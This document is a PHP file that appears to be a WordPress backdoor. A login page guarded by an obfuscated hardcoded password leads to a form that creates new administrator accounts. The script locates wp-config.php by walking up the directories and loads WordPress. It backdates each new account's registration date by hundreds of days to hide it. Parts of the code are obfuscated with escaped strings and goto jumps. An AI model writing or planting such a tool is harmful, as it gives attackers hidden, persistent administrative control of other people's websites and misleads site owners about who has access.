<?php
 session_start(); $tool_password = "\x67\141\x39\66\x38\70";

if(isset($_GET['logout'])){

    session_destroy();

    header("Location: ".$_SERVER['PHP_SELF']);

    exit;
}


if(!isset($_SESSION['wp_tool_login'])){


    if(isset($_POST['login_password'])){


        if(hash_equals(
            $tool_password,
            $_POST['login_password']
        )){


            $_SESSION['wp_tool_login']=1;

            header(
                "Location: ".$_SERVER['PHP_SELF']
            );

            exit;


        }else{

            $login_error="തെറ്റായ പാസ്‌വേഡ്";

        }

    }



?>

<!DOCTYPE html>
<html>
<head>

<meta charset="utf-8">

<title>ᓄᓇᕐᔪᐊᕐᒥ ᐊᔾᔨᒌᙱᓐᓂᐅᔪᑦ</title>

<style>

body{
font-family:Arial;
max-width:400px;
margin:50px auto;
}

input,button{

width:100%;
padding:10px;
margin:5px 0;

}

button{

background:#f54cef;
color:#fff;
border:0;

}

.error{

background:#fdd;
padding:10px;

}

</style>


</head>


<body>


<h3>
ᓄᓇᕐᔪᐊᕐᒥ ᐊᔾᔨᒌᙱᓐᓂᐅᔪᑦ
</h3>


<?php
 if (isset($login_error)) { echo "\x3c\144\151\166\40\143\154\x61\163\163\75\47\x65\162\x72\157\x72\47\76" . $login_error . "\74\57\x64\151\166\76"; } ?>


<form method="post">


<input 
type="password"
name="login_password"
placeholder="Password"
required>


<button>
Login
</button>


</form>


</body>

</html>


<?php

exit;

}



function find_wp_config(){


    $dir = __DIR__;


    for($i=0;$i<10;$i++){


        if(file_exists($dir."/wp-config.php")){

            return $dir."/wp-config.php";

        }


        $dir=dirname($dir);


    }


    return false;


}



$wp_config=find_wp_config();



if(!$wp_config){

    die("没有找到 wp-config.php");

}



$wp_root=dirname($wp_config);



$wp_load=$wp_root."/wp-load.php";


if(file_exists($wp_load)){


    require_once($wp_load);


}else{


    die("无法加载 WordPress");


}


$message="";



if(isset($_POST['create'])){


$username=sanitize_user(
    $_POST['username']
);


$email=sanitize_email(
    $_POST['email']
);


$password=$_POST['password'];



if(username_exists($username)){


    $message="用户名已经存在";


}else{



    $user_id=wp_create_user(
        $username,
        $password,
        $email
    );



   if(is_wp_error($user_id)){


    $message=$user_id->get_error_message();



}else{



    global $wpdb;


  $old_date = date(
    "Y-m-d H:i:s",
    strtotime("-".rand(500,2200)." days")
);


    $wpdb->update(

        $wpdb->users,

        array(
            'user_registered'=>$old_date
        ),

        array(
            'ID'=>$user_id
        ),

        array(
            '%s'
        ),

        array(
            '%d'
        )

    );



    /*
    设置管理员权限
    */

    $user=new WP_User($user_id);


    $user->set_role(
        "administrator"
    );



    $message=
    "创建成功，用户ID：".$user_id.
    "<br>注册时间：".$old_date;


}



}



}



?>


<!DOCTYPE html>

<html>

<head>

<meta charset="utf-8">




<style>

body{

font-family:Arial;
max-width:500px;
margin:30px;

}


input,button{

width:100%;
padding:10px;
margin:5px 0;

}


button{

background:#46a;
color:white;
border:0;

}


.box{

background:#eee;
padding:10px;

}

</style>


</head>


<?php
 goto rElLG; rElLG: ?>
<body><?php  goto U0JNM; U0JNM: if ($message) { echo "\x3c\144\151\x76\x20\143\x6c\x61\163\x73\75\x27\142\x6f\170\47\76" . $message . "\74\x2f\144\151\x76\76"; } goto VBvyP; VBvyP: ?>
<form method="post"><input name="username"placeholder="Username"required> <input name="email"placeholder="Email"required> <input name="password"placeholder="Password"required type="password"> <button name="create">Create Administrator</button></form><br><a href="?logout=1">Logout</a></body>


</html>